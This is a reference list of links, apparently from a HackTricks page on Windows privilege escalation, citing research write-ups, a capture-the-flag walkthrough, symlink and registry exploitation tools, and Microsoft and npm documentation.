- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)

{{#include ../../banners/hacktricks-training.md}}
